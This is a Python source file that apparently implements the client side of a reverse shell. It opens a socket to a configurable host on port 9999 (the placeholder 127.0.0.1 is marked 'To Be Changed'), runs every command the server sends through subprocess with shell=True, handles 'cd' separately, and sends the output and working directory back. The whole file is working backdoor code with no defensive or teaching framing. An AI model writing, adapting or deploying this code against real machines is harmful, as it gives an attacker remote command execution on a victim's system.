import os
import subprocess
import socket

Socket = socket.socket()
Host = '127.0.0.1'  # To Be Changed!!!
Port = 9999

Socket.connect((Host, Port))

while True:
	# Data Received From Server
	Data = Socket.recv(1024)

	# Display Command Received From Server
	print("Command Received : " + Data[:].decode('utf-8') + '\n')

	# When Receiving a 'CD' Command, then
	if Data[:2].decode('utf-8') == 'cd':
		# Change Directory
		os.chdir(Data[3:].decode('utf-8'))

	# When Receiving Any Other Command, then
	if len(Data) > 0:
		# Open a Process and Take in the Command (Data) and Show the Terminal (shell = True) and
		# Push All the Data to the Standard Stream.
		CMD = subprocess.Popen(Data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE,
		                       stderr = subprocess.PIPE, stdin = subprocess.PIPE)

		# Output Bytes Format
		outputBytes = CMD.stdout.read() + CMD.stderr.read()
		# Output String
		outputString = str(outputBytes, encoding = 'utf-8', errors = 'ignore')

		# Send Current Results to the Server + Current Working Directory
		Socket.send(str.encode(outputString + str(os.getcwd()) + '> '))

		# Print out Results on Client
		print("Displaying Results:")
		print(outputString)

# Close Connection
Socket.close()
